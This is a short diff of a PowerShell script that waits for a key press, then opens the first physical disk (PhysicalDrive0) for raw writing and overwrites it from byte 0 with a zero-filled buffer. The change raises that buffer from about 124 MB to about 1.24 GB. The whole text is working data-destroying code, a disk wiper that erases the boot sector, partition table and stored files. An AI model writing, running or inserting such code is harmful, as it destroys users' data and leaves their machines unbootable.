@@ -1,10 +1,10 @@
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 $disk = "\\.\PhysicalDrive0"
-$bytes = New-Object byte[](124096000)
+$bytes = New-Object byte[](1240960000)
 try {
     $stream = New-Object System.IO.FileStream($disk, 'Open', 'ReadWrite')
     $stream.Position = 0
-    $stream.Write($bytes, 0, 124096000)
+    $stream.Write($bytes, 0, 1240960000)
 } catch {
     Write-Host "Error writing to disk: $_"
 } finally {
